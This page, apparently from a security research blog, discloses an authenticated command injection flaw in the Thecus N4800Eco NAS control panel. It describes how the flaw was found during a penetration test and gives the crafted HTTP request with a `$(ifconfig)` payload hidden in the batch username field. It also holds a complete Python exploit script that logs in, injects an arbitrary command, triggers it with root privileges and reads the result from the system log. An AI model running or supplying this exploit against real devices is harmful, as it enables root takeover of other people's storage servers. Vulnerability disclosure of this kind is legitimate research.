=== Content from docs.unsafe-inline.com_3718a60b_20250114_231600.html ===
[![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MOWsiA3y7BsN5oohlsn%252Ficon%252FrpbbiObyjMteGqa61bzF%252Funnamed.jpg%3Falt%3Dmedia%26token%3Ded8305b2-a230-4c44-b1c4-f38ea271f0e9&width=32&dpr=4&quality=100&sign=70b95db7&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MOWsiA3y7BsN5oohlsn%252Ficon%252FrpbbiObyjMteGqa61bzF%252Funnamed.jpg%3Falt%3Dmedia%26token%3Ded8305b2-a230-4c44-b1c4-f38ea271f0e9&width=32&dpr=4&quality=100&sign=70b95db7&sv=2)UI](/)Search...Ctrl +â€†K

* [ABOUT US](/)
* [UNSAFE](/unsafe)
  + [sAMAccountName Spoofing in the Forest](/unsafe/samaccountname-spoofing-in-the-forest)
  + [Pass-the-Hash Attack Over Named Pipes Against ESET Server Security](/unsafe/pass-the-hash-attack-over-named-pipes-against-eset-server-security)
  + [Netcat Relay](/unsafe/netcat-relay)
  + [Hiren's BootCD in the AD](/unsafe/hirens-bootcd-in-the-ad)
  + [Abusing LAPS](/unsafe/abusing-laps)
* [INLINE](/inline)
  + [Asena](/inline/asena-tool)
  + [Suyla](/inline/suyla-tool)
  + [dcFinder](/inline/dcfinder)
* 0DAY
  + [ADManager Plus Build < 7210 Elevation of Privilege Vulnerability (CVE-2024-24409)](/0day/admanager-plus-build-less-than-7210-elevation-of-privilege-vulnerability-cve-2024-24409)
  + [Asp.Net Zero v12.3.0 - HTML Injection Leads To Open Redirect via Websockets (CVE-2023-48003)](/0day/asp.net-zero-v12.3.0-html-injection-leads-to-open-redirect-via-websockets-cve-2023-48003)
  + [ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure (CVE-2023-31492)](/0day/manageengine-admanager-plus-build-less-than-7183-recovery-password-disclosure-cve-2023-31492)
  + [Multiple ManageEngine Applications Critical Information Disclosure Vulnerability](/0day/multiple-manageengine-applications-critical-information-disclosure-vulnerability)
  + [Thecus N4800Eco Nas Server Control Panel Comand Injection](/0day/thecus-n4800eco-nas-server-control-panel-comand-injection)
  + [ManageEngine ADSelfService Plus 6.1 CSV Injection (CVE-2021-33256)](/0day/manageengine-adselfservice-plus-6.1-csv-injection)
  + [Openlitespeed Web Server 1.7.8 - Privilege Escalation (CVE-2021-26758)](/0day/openlitespeed-web-server-1.7.8-command-injection-to-privilege-escalation-cve-2021-26758)
  + [KLOG Server (Authenticated) Command Injection (CVE-2021-3317)](/0day/klog-server-authenticated-command-injection)
  + [Cokpit version 234 - Server Side Request Forgery (CVE-2020-35850)](/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850)
  + [KLOG Server Unauthenticated Command Injection (CVE-2020-35729)](/0day/klog-server-unauthentication-command-injection)
  + [Pearson Vue - VUEApplicationWrapper Unquoted Service Path (CVE-2020-36154)](/0day/pearson-vue-vueapplicationwrapper-unquoted-service-path)
  + [Intel(r) Management and Security Application 5.2 - UNS Unquoted Service Path](/0day/intel-uns-unquoted-service-path)
  + [BRAdmin Professional 3.75 - Unquoted Service Path](/0day/bradmin-professional-3.75-unquoted-service-path)

[Powered by GitBook](https://www.gitbook.com/?utm_source=content&utm_medium=trademark&utm_campaign=-MOWsiA3y7BsN5oohlsn)On this page

Was this helpful?

1. [0DAY](/0day)
# Thecus N4800Eco Nas Server Control Panel Comand Injection

Command Injection vulnerability that lets attacker for executing command with root privileges.

[PreviousMultiple ManageEngine Applications Critical Information Disclosure Vulnerability](/0day/multiple-manageengine-applications-critical-information-disclosure-vulnerability)[NextManageEngine ADSelfService Plus 6.1 CSV Injection (CVE-2021-33256)](/0day/manageengine-adselfservice-plus-6.1-csv-injection)

Last updated 9 months ago

I have discovered command injection vulnerability on the Thecus N4800Eco Nas Server control panel during penetration test. I could not analyze source code because I didn't have enough time. Hence, I will describe only how vulnerability is detected.

### **# Description**

Firstly, I have tried to add user through *Local User Configuration*, but server didn't accept special chars such as `$)(` . Also, user and group could be created using *Batch Input* option that is under the *User and Group Authentication* section. I set Batch Content as `$(ifconfig),22222,9999` that corresponds to username, password and group name.

Request:Copy
```
POST /adm/setmain.php?fun=setbatch HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: https://target
Connection: close
Referer: https://target/adm/index.php
Cookie: select_md=0; MYSESSID=*
batch_content=%24(ifconfig)%2C22222%2C9999
```

So that filtering can be bypassed using *Batch Content* option for adding malicious payload as username. After the user adding process, I sent second request for deleting `$(ifconfig)` user and *Local User remove succeeds* response is returned. However the user was not deleted, it is very interesting to me. I tried to understand what happened and noticed that there is a *system log* section.

Surprisingly I saw that `ifconfig` command is executed.

For verifying the command injection vulnerability i tried another command such as `id`

So there is a comman injection vulnerability that lets to execute command with `root` privilege. `Username` parameter seems to vulnerable. It is time to write basic Python script.

Copy
```
import requests
import sys
import urllib3
# To fix SSL error that occurs when script is started.
# 1- Open /etc/ssl/openssl.cnf file
# At the bottom of the file:
# [system_default_sect]
# MinProtocol = TLSv1.2
# CipherString = DEFAULT@SECLEVEL=2
# 2- Set value of MinProtocol as TLSv1.0
def readResult(s, target):
    d = {
        "fun": "setlog",
        "action": "query",
        "params": '[{"start":0,"limit":1,"catagory":"sys","level":"all"}]'
    }
    url = "https://" + target + "/adm/setmain.php"
    resultReq = s.post(url, data=d, verify=False)
    dict = resultReq.text.split()
    print("[+] Reading system log...\n")
    #Set your command output range
    print(dict[5:8])
def delUser(s, target, command):
    d = {
        "action": "delete",
        "username": "$("+command+")"
    }
    url = "https://" + target + "/adm/setmain.php?fun=setlocaluser"
    delUserReq = s.post(url, data=d, allow_redirects=False, verify=False)
    if 'Local User remove succeeds' in delUserReq.text:
        print('[+] %s command was executed successfully' % command)
    else:
        print('[-] %s command was not executed!' %command)
        sys.exit(1)
    readResult(s, target)
def addUser(s, target, command):
    d = {'batch_content': '%24('+command+')%2C22222%2C9999'}
    url = "https://" + target + "/adm/setmain.php?fun=setbatch"
    addUserReq = s.post(url, data=d, allow_redirects=False, verify=False)
    if 'Users and groups were created successfully.' in addUserReq.text:
        print('[+] Users and groups were created successfully')
    else:
        print('[-] Users and groups were not created')
        sys.exit(1)
    delUser(s, target, command)
def login(target, username, password, command=None):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = requests.Session()
    d = {
        "&eplang": "english",
        "p_pass": password,
        "p_user": username,
        "username": username,
        "pwd": password,
        "action": "login",
        "option": "com_extplorer"
    }
    url = "https://" + target + "/adm/login.php"
    loginReq = s.post(url, data=d, allow_redirects=False, verify=False)
    if '"success":true' in loginReq.text:
        print('[+] Authentication successful')
    elif '"success":false' in loginReq.text:
        print('[-] Authentication failed!')
        sys.exit(1)
    else:
        print('[-] Something went wrong!')
        sys.exit(1)
    addUser(s, target, command)
def main(args):
    if len(args) != 5:
        print("usage: %s targetIp:port username password command" % (args[0]))
        print("Example 192.168.1.13:80 admin admin id")
        sys.exit(1)
    login(target=args[1], username=args[2], password=args[3], command=args[4])
if __name__ == "__main__":
    main(args=sys.argv)
```
Copy
```
# Author: Metin Yunus Kandemir
```
![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-Mai69dOirBetXp-Y_fu%252F-Mai6cPXl4ApU36QUf3W%252F2-2.PNG%3Falt%3Dmedia%26token%3D5ee3753e-0d0e-4e7d-84fc-3b679616d24b&width=768&dpr=4&quality=100&sign=2eca0d5a&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-Mai69dOirBetXp-Y_fu%252F-Mai6ExqB7i_tEhJSUb6%252F1-1.PNG%3Falt%3Dmedia%26token%3D2a504bc4-0c3e-4352-a8f0-bc69741654b0&width=768&dpr=4&quality=100&sign=c8c138a8&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MaiKlhFI5r2BBauo8Go%252F-MaiLoSVnY0LBioSVVJC%252F8-1.PNG%3Falt%3Dmedia%26token%3De45ac954-9dcd-4c87-a071-785113cc43ee&width=768&dpr=4&quality=100&sign=437c9965&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MaiDqIRgJs4ZH9bbyen%252F-MaiGvM6NURXxuYReF2W%252F4-1.png%3Falt%3Dmedia%26token%3D222139eb-b074-45b6-9b58-f9bcf8cca54c&width=768&dpr=4&quality=100&sign=2b5ede86&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MaiDqIRgJs4ZH9bbyen%252F-MaiFTbORc7O-jDgi_PM%252F3-1.PNG%3Falt%3Dmedia%26token%3D2f3e57f1-e825-452a-80d3-9d3cf8d2a852&width=768&dpr=4&quality=100&sign=5aa72e41&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MaiMIoYzcA_EJNt2Fnn%252F-MaiNAKfe6a8EUpfgRX6%252F8-2.PNG%3Falt%3Dmedia%26token%3D4afb5c26-b002-4b35-995b-2984875991d2&width=768&dpr=4&quality=100&sign=93d3eb71&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MaiT-6iAD4WGkIDmhHI%252F-MaiUecBtiNYXyX05abI%252F8-3.PNG%3Falt%3Dmedia%26token%3D06b0c494-0bc4-4ec6-b7d3-f124f7daaea3&width=768&dpr=4&quality=100&sign=20a9d9e3&sv=2)
